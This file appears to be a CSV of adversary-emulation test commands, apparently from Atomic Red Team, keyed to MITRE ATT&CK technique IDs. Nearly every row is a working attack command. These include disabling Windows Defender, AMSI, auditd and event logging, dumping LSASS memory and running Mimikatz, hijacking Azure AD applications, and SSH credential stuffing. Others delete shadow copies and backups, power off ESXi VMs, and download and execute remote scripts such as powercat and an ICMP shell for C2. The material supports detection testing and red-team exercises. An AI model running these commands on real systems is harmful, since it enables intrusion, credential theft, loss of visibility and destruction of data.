T1562,Clear Pagging Cache,free && echo 3 > /proc/sys/vm/drop_caches && free echo 3> /proc/sys/vm/drop_caches
T1562,Disable Memory Swap,swapon -a sleep 2 swapoff -a sync
T1562,Disable Hypervisor-Enforced Code Integrity (HVCI),"reg add ""hklm\system\currentcontrolset\control\deviceguard\scenarios\hypervisorenforcedcodeintegrity"" /v ""enabled"" /t reg_dword /d 0 /f"
T1562,AMSI Bypass - Override AMSI via COM,reg add hkcu\software\classes\clsid\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\inprocserver32 /ve /t reg_sz /d c:\idontexist.dll /f
T1562,AWS - GuardDuty Suspension or Deletion,"detectorid=$(aws guardduty create-detector --enable --region ""#{region}"" | grep -op '(?<=""detectorid"": "")[^""]*') aws guardduty update-detector --no-enable --detector-id $detectorid aws guardduty delete-detector --detector-id $detectorid"
T1562,Tamper with Defender ATP on Linux/MacOS,sudo mdatp config real-time-protection --value disabled
T1562,Tamper with Windows Defender Registry - Reg.exe,"reg add ""hklm\software\policies\microsoft\windows defender"" /v ""disableantispyware"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender"" /v ""disableantivirus"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disablebehaviormonitoring"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disableintrusionpreventionsystem"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disableioavprotection"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disableonaccessprotection"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disablerealtimemonitoring"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disableroutinelytakingaction"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disablescanonrealtimeenable"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\real-time protection"" /v ""disablescriptscanning"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\reporting"" /v ""disableenhancednotifications"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\spynet"" /v ""disableblockatfirstseen"" /t reg_dword /d ""1"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\spynet"" /v ""spynetreporting"" /t reg_dword /d ""0"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender\mpengine"" /v ""mpenablepus"" /t reg_dword /d ""0"" /f >nul 2>nul reg add ""hklm\software\policies\microsoft\windows defender security center\app and browser protection"" /v ""disallowexploitprotectionoverride"" /t reg_dword /d ""0"" /f >nul 2>nul reg add ""hklm\software\microsoft\windows defender\features"" /v ""tamperprotection"" /t reg_dword /d ""0"" /f >nul 2>nul reg add ""hklm\software\microsoft\windows defender\spynet"" /v ""submitsamplesconsent"" /t reg_dword /d ""0"" /f >nul 2>nul reg add ""hklm\software\microsoft\windows defender"" /v ""puaprotection"" /t reg_dword /d ""0"" /f >nul 2>nul"
T1562,Tamper with Windows Defender Registry - Powershell,"set-itemproperty ""hklm:\software\policies\microsoft\windows defender"" -name ""disableantispyware"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender"" -name ""disableantivirus"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disablebehaviormonitoring"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disableintrusionpreventionsystem"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disableioavprotection"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disableonaccessprotection"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disablerealtimemonitoring"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disableroutinelytakingaction"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disablescanonrealtimeenable"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\real-time protection"" -name ""disablescriptscanning"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\reporting"" -name ""disableenhancednotifications"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\spynet"" -name ""disableblockatfirstseen"" -value 1 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\spynet"" -name ""spynetreporting"" -value 0 set-itemproperty ""hklm:\software\policies\microsoft\windows defender\mpengine"" -name ""mpenablepus"" -value 0 set-itemproperty ""hklm:\software\policies\microsoft\windows defender security center\app and browser protection"" -name ""disallowexploitprotectionoverride"" -value 0 set-itemproperty ""hklm:\software\microsoft\windows defender\features"" -name ""tamperprotection"" -value 0 set-itemproperty ""hklm:\software\microsoft\windows defender\spynet"" -name ""submitsamplesconsent"" -value 0 set-itemproperty ""hklm:\software\microsoft\windows defender"" -name ""puaprotection"" -value 0"
T1562,ESXi - Disable Account Lockout Policy via PowerCLI,set-powercliconfiguration -invalidcertificateaction ignore -participateinceip:$false -confirm:$false connect-viserver -server #{vm_host} -user #{vm_user} -password #{vm_pass} get-advancedsetting -entity #{vm_host} -name 'security.accountlockfailures' | set-advancedsetting -value '0' -confirm:$false disconnect-viserver -confirm:$false
T1562,Delete Microsoft Defender ASR Rules - InTune,"$registrypath = ""hklm:\software\policies\microsoft\windows defender\policy manager"" if (-not (test-path $registrypath)) { new-item -path $registrypath -force write-host ""registry key created: $registrypath"" } $registryvaluename = ""asrrules"" if (test-path ""$registrypath\$registryvaluename"") { remove-itemproperty -path $registrypath -name $registryvaluename write-host ""registry value deleted: $registryvaluename"" } else { new-itemproperty -path $registrypath -name $registryvaluename -propertytype string -value ""36190899-1602-49e8-8b27-eb1d0a1ce869=1"" -force write-host ""registry value created: $registryvaluename"" } remove-itemproperty -path $registrypath -name $registryvaluename write-host ""registry value deleted: $registryvaluename"""
T1562,Delete Microsoft Defender ASR Rules - GPO,"$registrypath = ""hklm:\software\policies\microsoft\windows defender\windows defender exploit guard\asr\rules"" if (-not (test-path $registrypath)) { new-item -path $registrypath -force write-host ""registry key created: $registrypath"" } $newvaluename = ""36190899-1602-49e8-8b27-eb1d0a1ce869"" $newvaluedata = ""1"" new-itemproperty -path $registrypath -name $newvaluename -propertytype string -value $newvaluedata -force write-host ""registry value created: $newvaluename with data $newvaluedata"" remove-itemproperty -path $registrypath -name $newvaluename write-host ""registry value deleted: $newvaluename"""
T1562,AMSI Bypass - Create AMSIEnable Reg Key,"new-item -path ""hkcu:\software\microsoft\windows script\settings"" -force | out-null new-itemproperty -path ""hkcu:\software\microsoft\windows script\settings"" -name ""amsienable"" -value 0 -propertytype dword -force | out-null"
T1562,Disable EventLog-Application Auto Logger Session Via Registry - Cmd,"reg add ""hklm\system\currentcontrolset\control\wmi\autologger\eventlog-application"" /v ""start"" /t reg_dword /d ""0"" /f"
T1562,Disable EventLog-Application Auto Logger Session Via Registry - PowerShell,"new-itemproperty -path hklm:\system\currentcontrolset\control\wmi\autologger\eventlog-application -name start -value 0 -propertytype ""dword"" -force"
T1562,Disable EventLog-Application ETW Provider Via Registry - Cmd,"reg add ""hklm\system\currentcontrolset\control\wmi\autologger\eventlog-application\#{etwproviderguid}"" /v ""enabled"" /t reg_dword /d ""0"" /f"
T1562,Disable EventLog-Application ETW Provider Via Registry - PowerShell,"new-itemproperty -path ""hklm:\system\currentcontrolset\control\wmi\autologger\eventlog-application\#{etwproviderguid}"" -name enabled -value 0 -propertytype ""dword"" -force"
T1562,Freeze PPL-protected process with EDR-Freeze,"# enable sedebugprivilege add-type -typedefinition @"" using system; using system.runtime.interopservices; public class tokenadjuster { [dllimport(""advapi32.dll"", setlasterror = true)] public static extern bool openprocesstoken(intptr processhandle, uint desiredaccess, out intptr tokenhandle); [dllimport(""advapi32.dll"", setlasterror = true)] public static extern bool lookupprivilegevalue(string lpsystemname, string lpname, out long lpluid); [dllimport(""advapi32.dll"", setlasterror = true)] public static extern bool adjusttokenprivileges(intptr tokenhandle, bool disableallprivileges, ref token_privileges newstate, uint bufferlength, intptr previousstate, intptr returnlength); [structlayout(layoutkind.sequential, pack = 1)] public struct token_privileges { public int privilegecount; public long luid; public int attributes; } public const int se_privilege_enabled = 0x00000002; public const uint token_adjust_privileges = 0x0020; public const uint token_query = 0x0008; public static bool enablesedebugprivilege() { intptr htoken; if (!openprocesstoken(system.diagnostics.process.getcurrentprocess().handle, token_adjust_privileges | token_query, out htoken)) return false; long luid; if (!lookupprivilegevalue(null, ""sedebugprivilege"", out luid)) return false; token_privileges tp = new token_privileges(); tp.privilegecount = 1; tp.luid = luid; tp.attributes = se_privilege_enabled; return adjusttokenprivileges(htoken, false, ref tp, 0, intptr.zero, intptr.zero); } } ""@ $result = [tokenadjuster]::enablesedebugprivilege() if ($result) { write-host ""sedebugprivilege enabled successfully."" -foregroundcolor green } else { write-host ""failed to enable sedebugprivilege."" -foregroundcolor red exit 1 } # get basic process info $process = get-process -name $#{processname} -erroraction stop $processname = $process.processname write-host ""process name: $processname)"" write-host ""pid: $($process.id)"" # get executable path and user info $query = ""select * from win32_process where name = '$processname.exe'"" $wmiprocess = get-wmiobject -query $query $owner = $wmiprocess.getowner() write-host ""user: $($owner.domain)\$($owner.user)"" # get the folder of the current script $scriptfolder = split-path -parent $myinvocation.mycommand.definition # download latest edr-freeze package and extract (force replace) $downloadurl = ""https://github.com/twosevenonet/edr-freeze/releases/download/main/edr-freeze_1.0.zip"" $zippath = join-path $scriptfolder ""edr-freeze_1.0.zip"" write-host ""downloading latest edr-freeze from $downloadurl"" -foregroundcolor cyan try { invoke-webrequest -uri $downloadurl -outfile $zippath -usebasicparsing -erroraction stop write-host ""download completed: $zippath"" -foregroundcolor green $extractfolder = $scriptfolder if (test-path $zippath) { write-host ""extracting archive to $extractfolder (overwriting existing files)"" -foregroundcolor cyan if (test-path $extractfolder) { # ensure target exe not locked; attempt to stop any running instance silently get-process -name ""edr-freeze_1.0"" -erroraction silentlycontinue | stop-process -force -erroraction silentlycontinue } add-type -assemblyname system.io.compression.filesystem 2>$null # custom extraction routine (overwrite existing) compatible with .net framework (no bool overwrite overload) $archive = $null try { $archive = [system.io.compression.zipfile]::openread($zippath) foreach ($entry in $archive.entries) { if ([string]::isnullorwhitespace($entry.fullname)) { continue } if ($entry.fullname.endswith('/')) { # directory entry $dirpath = join-path $extractfolder $entry.fullname if (-not (test-path $dirpath)) { new-item -itemtype directory -path $dirpath -force | out-null } continue } $destpath = join-path $extractfolder $entry.fullname $destdir = split-path $destpath -parent if (-not (test-path $destdir)) { new-item -itemtype directory -path $destdir -force | out-null } if (test-path $destpath) { remove-item -path $destpath -force -erroraction silentlycontinue } try { # use static extension method (powershell 5.1 compatible) [system.io.compression.zipfileextensions]::extracttofile($entry, $destpath, $false) } catch { write-host ""failed to extract entry $($entry.fullname): $_"" -foregroundcolor yellow } } write-host ""extraction completed."" -foregroundcolor green } finally { if ($archive) { $archive.dispose() } } } } catch { write-host ""failed to download or extract edr-freeze: $_"" -foregroundcolor red } # wait 15s before putting targeted process before putting it in the comma write-host ""waiting 15s before putting $processname in the comma"" -foregroundcolor yellow start-sleep -seconds 5 write-host ""waiting 10s before putting $processname in the comma"" -foregroundcolor yellow start-sleep -seconds 5 write-host ""waiting 5s before putting $processname in the comma"" -foregroundcolor yellow start-sleep -seconds 3 write-host ""waiting 2s before putting $processname in the comma"" -foregroundcolor yellow start-sleep -seconds 2 # put targeted process in the comma for 15s # discover the edr-freeze executable dynamically (pick most recent if multiple) $edrfreezeexename = get-childitem -path $scriptfolder -filter 'edr-freeze_*.exe' -erroraction silentlycontinue | sort-object lastwritetime -descending | select-object -first 1 -expandproperty name if (-not $edrfreezeexename) { write-host ""no edr-freeze executable (edr-freeze_*.exe) found in $scriptfolder"" -foregroundcolor red exit 1 } $edrfreezeexe = join-path $scriptfolder $edrfreezeexename write-host ""using edr-freeze executable: $edrfreezeexename"" -foregroundcolor cyan write-host ""$processname putted in the comma for 15s, by targetting process id $($htaprocess.id)"" -foregroundcolor yellow start-process -filepath $edrfreezeexe -argumentlist (""$($process.id) 15000"") | out-null"
T1562,Disable ASLR Via sysctl parameters - Linux,sysctl -w kernel.randomize_va_space=0
T1123,using device audio capture commandlet,$mic = get-audiodevice -recording set-audiodevice -id $mic.id start-sleep -seconds 5
T1123,Registry artefact when application use microphone,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1123,using Quicktime Player,sh #{filename} #{audiofile} #{duration}
T1098,Azure AD Application Hijacking - Service Principal,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential > $null $sp = get-azureadserviceprincipal -searchstring ""#{service_principal_name}"" | select-object -first 1 if ($sp -eq $null) { write-warning ""service principal not found""; exit } # in the context of an art test (and not a real attack), we don't need to keep access for too long. in case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long $crednotafter = (get-date).adddays(1) $certnotafter = (get-date).adddays(2) # certificate expiry must be later than cred expiry $cert = new-selfsignedcertificate -dnsname ""atomicredteam.example.com"" -friendlyname ""atomiccert"" -certstorelocation cert:\currentuser\my -keyexportpolicy exportable -provider ""microsoft enhanced rsa and aes cryptographic provider"" -notafter $certnotafter $keyvalue = [system.convert]::tobase64string($cert.getrawcertdata()) write-host ""generated certificate """"$($cert.thumbprint)"""""" new-azureadserviceprincipalkeycredential -objectid $sp.objectid -type asymmetricx509cert -customkeyidentifier ""atomictest"" -usage verify -value $keyvalue -enddate $crednotafter start-sleep -s 30 $tenant = get-azureadtenantdetail $auth = connect-azuread -tenantid $tenant.objectid -applicationid $sp.appid -certificatethumbprint $cert.thumbprint write-host ""application hijacking worked. logged in successfully as $($auth.account.id) of type $($auth.account.type)"" write-host ""end of hijacking"""
T1098,Azure AD Application Hijacking - App Registration,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential > $null $app = get-azureadapplication -searchstring ""#{application_name}"" | select-object -first 1 if ($app -eq $null) { write-warning ""application not found""; exit } # in the context of an art test (and not a real attack), we don't need to keep access for too long. in case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long $crednotafter = (get-date).adddays(1) $certnotafter = (get-date).adddays(2) # certificate expiry must be later than cred expiry $cert = new-selfsignedcertificate -dnsname ""atomicredteam.example.com"" -friendlyname ""atomiccert"" -certstorelocation cert:\currentuser\my -keyexportpolicy exportable -provider ""microsoft enhanced rsa and aes cryptographic provider"" -notafter $certnotafter $keyvalue = [system.convert]::tobase64string($cert.getrawcertdata()) write-host ""generated certificate """"$($cert.thumbprint)"""""" new-azureadapplicationkeycredential -objectid $app.objectid -type asymmetricx509cert -customkeyidentifier ""atomictest"" -usage verify -value $keyvalue -enddate $crednotafter start-sleep -s 30 $tenant = get-azureadtenantdetail $auth = connect-azuread -tenantid $tenant.objectid -applicationid $app.appid -certificatethumbprint $cert.thumbprint write-host ""application hijacking worked. logged in successfully as $($auth.account.id) of type $($auth.account.type)"" write-host ""end of hijacking"""
T1098,AWS - Create Access Key and Secret Key,"aws iam create-access-key --user-name #{username} > ""$pathtoatomicsfolder/t1098.001/bin/aws_secret.creds"" cd ""$pathtoatomicsfolder/t1098.001/bin/"" ./aws_secret.sh"
T1562,ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI,"set-powercliconfiguration -invalidcertificateaction ignore -participateinceip:$false -confirm:$false connect-viserver -server #{vm_host} -user #{vm_user} -password #{vm_pass} (get-esxcli -vmhost #{vm_host} -v2).software.acceptance.set.invoke(@{level = ""communitysupported""}) disconnect-viserver -confirm:$false"
T1562,ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1562,PowerShell Version 2 Downgrade,powershell -version 2 -command '#{v2_command}'
T1095,ICMP C2,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/shells/invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress #{server_ip}
T1095,Netcat C2,"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}"
T1095,Powercat C2,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port}
T1505,Install MS Exchange Transport Agent Persistence,"install-transportagent -name #{transport_agent_identity} -transportagentfactory #{class_factory} -assemblypath #{dll_path} enable-transportagent #{transport_agent_identity} get-transportagent | format-list name,enabled"
T1195,Octopus Scanner Malware Open Source Supply Chain,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f"
T1003,Dump LSASS.exe Memory using ProcDump,"""#{procdump_exe}"" -accepteula -ma lsass.exe #{output_file}"
T1003,Dump LSASS.exe Memory using comsvcs.dll,"c:\windows\system32\rundll32.exe c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id $env:temp\lsass-comsvcs.dmp full"
T1003,Dump LSASS.exe Memory using direct system calls and API unhooking,"""#{dumpert_exe}"""
T1003,Dump LSASS.exe Memory using NanoDump,"pathtoatomicsfolder\..\externalpayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp"""
T1003,Offline Credential Theft With Mimikatz,"""#{mimikatz_exe}"" ""sekurlsa::minidump #{input_file}"" ""sekurlsa::logonpasswords full"" exit"
T1003,LSASS read with pypykatz,"""#{venv_path}\scripts\pypykatz"" live lsa"
T1003,Dump LSASS.exe Memory using Out-Minidump.ps1,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 new-item -type directory ""pathtoatomicsfolder\..\externalpayloads\"" -erroraction ignore -force | out-null try{ iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1003.001/src/out-minidump.ps1') -erroraction stop} catch{ $_; exit $_.exception.response.statuscode.value__} get-process lsass | out-minidump"
T1003,Create Mini Dump of LSASS.exe using ProcDump,"""#{procdump_exe}"" -accepteula -mm lsass.exe #{output_file}"
T1003,Powershell Mimikatz,iex (new-object net.webclient).downloadstring('#{remote_script}'); invoke-mimikatz -dumpcreds
T1003,Dump LSASS with createdump.exe from .Net v5,"$exepath = resolve-path ""$env:programfiles\dotnet\shared\microsoft.netcore.app\5*\createdump.exe"" & ""$exepath"" -u -f $env:temp\dotnet-lsass.dmp (get-process lsass).id"
T1003,Dump LSASS.exe using imported Microsoft DLLs,#{xordump_exe} -out #{output_file} -x 0x41
T1003,Dump LSASS.exe using lolbin rdrleakdiag.exe,"if (test-path -path ""$env:systemroot\system32\rdrleakdiag.exe"") { $binary_path = ""$env:systemroot\system32\rdrleakdiag.exe"" } elseif (test-path -path ""$env:systemroot\syswow64\rdrleakdiag.exe"") { $binary_path = ""$env:systemroot\syswow64\rdrleakdiag.exe"" } else { $binary_path = ""file not found"" exit 1 } $lsass_pid = get-process lsass |select -expand id if (-not (test-path -path""$env:temp\t1003.001-13-rdrleakdiag"")) {new-item -itemtype directory -path $env:temp\t1003.001-13-rdrleakdiag -force} write-host $binary_path /p $lsass_pid /o $env:temp\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 & $binary_path /p $lsass_pid /o $env:temp\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 write-host ""minidump file, minidump_$lsass_pid.dmp can be found inside $env:temp\t1003.001-13-rdrleakdiag directory."""
T1003,Dump LSASS.exe Memory through Silent Process Exit,"pathtoatomicsfolder\..\externalpayloads\nanodump.x64.exe --silent-process-exit ""#{output_folder}"""
T1529,Shutdown System - Windows,shutdown /s /t #{timeout}
T1529,Restart System - Windows,shutdown /r /t #{timeout}
T1529,Restart System via `shutdown` - FreeBSD/macOS/Linux,shutdown -r #{timeout}
T1529,Shutdown System via `shutdown` - FreeBSD/macOS/Linux,shutdown -h #{timeout}
T1529,Restart System via `reboot` - FreeBSD/macOS/Linux,reboot
T1529,Shutdown System via `halt` - FreeBSD/Linux,halt -p
T1529,Reboot System via `halt` - FreeBSD,halt -r
T1529,Reboot System via `halt` - Linux,halt --reboot
T1529,Shutdown System via `poweroff` - FreeBSD/Linux,poweroff
T1529,Reboot System via `poweroff` - FreeBSD,poweroff -r 3
T1529,Reboot System via `poweroff` - Linux,poweroff --reboot
T1529,Logoff System - Windows,shutdown /l
T1529,ESXi - Terminates VMs using pkill,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1529,ESXi - Avoslocker enumerates VMs and forcefully kills VMs,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1529,ESXi - vim-cmd Used to Power Off VMs,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done"""
T1529,Abuse of Linux Magic System Request Key for Reboot,"echo ""b"" > /proc/sysrq-trigger"
T1562,Delete all auditd rules using auditctl,auditctl -d
T1562,Disable auditd using auditctl,auditctl -e 0
T1222,Take ownership using takeown utility,takeown.exe /f #{file_folder_to_own} /r
T1222,cacls - Grant permission to specified user or group recursively,icacls.exe #{file_or_folder} /grant #{user_or_group}:f
T1222,attrib - Remove read-only attribute,attrib.exe -r #{file_or_folder}\*.* /s
T1222,attrib - hide file,mkdir #{file_or_folder} >nul 2>&1 echo t1222.001_attrib1 >> #{file_or_folder}\t1222.001_attrib1.txt echo t1222.001_attrib2 >> #{file_or_folder}\t1222.001_attrib2.txt attrib.exe +h #{file_or_folder}\t1222.001_attrib1.txt attrib.exe +h #{file_or_folder}\t1222.001_attrib2.txt
T1222,Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"icacls ""#{path}"" /grant everyone:f /t /c /q"
T1222,SubInAcl Execution,"""c:\program files (x86)\windows resource kits\tools\subinacl.exe"""
T1216,PubPrn.vbs Signed Script Bypass,"cscript.exe /b c:\windows\system32\printing_admin_scripts\en-us\pubprn.vbs localhost ""script:#{remote_payload}"""
T1110,SSH Credential Stuffing From Linux,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1110,SSH Credential Stuffing From MacOS,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1110,SSH Credential Stuffing From FreeBSD,"cp $pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1110,Brute Force:Credential Stuffing using Kerbrute Tool,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} ""pathtoatomicsfolder\..\externalpayloads\bruteforce.txt"""
T1059,Execute shell script via python's command mode arguement,"which_python=$(which python || which python3 || which python3.9 || which python2) $which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'"
T1059,Execute Python via scripts,"which_python=$(which python || which python3 || which python3.9 || which python2) echo 'import requests' > #{python_script_name} echo 'import os' >> #{python_script_name} echo 'url = ""#{script_url}""' >> #{python_script_name} echo 'malicious_command = ""#{executor} #{payload_file_name} #{script_args}""' >> #{python_script_name} echo 'session = requests.session()' >> #{python_script_name} echo 'source = session.get(url).content' >> #{python_script_name} echo 'fd = open(""#{payload_file_name}"", ""wb+"")' >> #{python_script_name} echo 'fd.write(source)' >> #{python_script_name} echo 'fd.close()' >> #{python_script_name} echo 'os.system(malicious_command)' >> #{python_script_name} $which_python #{python_script_name}"
T1059,Execute Python via Python executables,"which_python=$(which python || which python3 || which python3.9 || which python2) echo 'import requests' > #{python_script_name} echo 'import os' >> #{python_script_name} echo 'url = ""#{script_url}""' >> #{python_script_name} echo 'malicious_command = ""#{executor} #{payload_file_name} #{script_args}""' >> #{python_script_name} echo 'session = requests.session()' >> #{python_script_name} echo 'source = session.get(url).content' >> #{python_script_name} echo 'fd = open(""#{payload_file_name}"", ""wb+"")' >> #{python_script_name} echo 'fd.write(source)' >> #{python_script_name} echo 'fd.close()' >> #{python_script_name} echo 'os.system(malicious_command)' >> #{python_script_name} $which_python -c 'import py_compile; py_compile.compile(""#{python_script_name}"", ""#{python_binary_name}"")' $which_python #{python_binary_name}"
T1059,Python pty module and spawn function used to spawn sh or bash,"which_python=$(which python || which python3 || which python3.9 || which python2) $which_python -c ""import pty;pty.spawn('/bin/sh')"" exit $which_python -c ""import pty;pty.spawn('/bin/bash')"" exit"
T1049,System Network Connections Discovery,netstat -ano net use net sessions 2>nul
T1049,System Network Connections Discovery with PowerShell,get-nettcpconnection
T1049,System Network Connections Discovery via PowerShell (Process Mapping),"get-nettcpconnection | foreach-object { $p = get-process -id $_.owningprocess -erroraction silentlycontinue [pscustomobject]@{ local = ""$($_.localaddress):$($_.localport)"" remote = ""$($_.remoteaddress):$($_.remoteport)"" state = $_.state pid = $_.owningprocess process = if ($p) { $p.processname } else { $null } } } | sort-object state,process | format-table -autosize"
T1049,System Network Connections Discovery via ss or lsof (Linux/MacOS),if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -np 2>/dev/null || true; fi
T1049,"System Network Connections Discovery FreeBSD, Linux & MacOS",netstat who -a
T1049,"System Network Connections Discovery via sockstat (Linux, FreeBSD)",sockstat -4 sockstat -6 2>/dev/null || true sockstat -l 2>/dev/null || true
T1049,System Discovery using SharpView,$syntaxlist = #{syntax} foreach ($syntax in $syntaxlist) { #{sharpview} $syntax -}
T1490,Windows - Delete Volume Shadow Copies,vssadmin.exe delete shadows /all /quiet
T1490,Windows - Delete Volume Shadow Copies via WMI,wmic.exe shadowcopy delete
T1490,Windows - wbadmin Delete Windows Backup Catalog,wbadmin delete catalog -quiet
T1490,Windows - Disable Windows Recovery Console Repair,bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no
T1490,Windows - Delete Volume Shadow Copies via WMI with PowerShell,get-wmiobject win32_shadowcopy | foreach-object {$_.delete();}
T1490,Windows - Delete Backup Files,del /s /f /q c:\*.vhd c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
T1490,Windows - wbadmin Delete systemstatebackup,wbadmin delete systemstatebackup -keepversions:0
T1490,Windows - Disable the SR scheduled task,"schtasks.exe /change /tn ""\microsoft\windows\systemrestore\sr"" /disable"
T1490,Disable System Restore Through Registry,"reg add ""hklm\software\policies\microsoft\windows nt\systemrestore"" /v ""disableconfig"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\policies\microsoft\windows nt\systemrestore"" /v ""disablesr"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\systemrestore"" /v ""disableconfig"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\systemrestore"" /v ""disablesr"" /t ""reg_dword"" /d ""1"" /f"
T1490,Windows - vssadmin Resize Shadowstorage Volume,vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%
T1490,Modify VSS Service Permissions,sc sdset vss d:(d;;ga;;;nu)(d;;ga;;;wd)(d;;ga;;;an)s:(au;fa;ga;;;wd)(au;oiiofa;ga;;;wd)
T1490,Disable Time Machine,sudo tmutil disable
T1546,Netsh Helper DLL Registration,"netsh.exe add helper ""#{helper_file}"" taskkill /im notepad.exe /t /f > nul 2>&1"
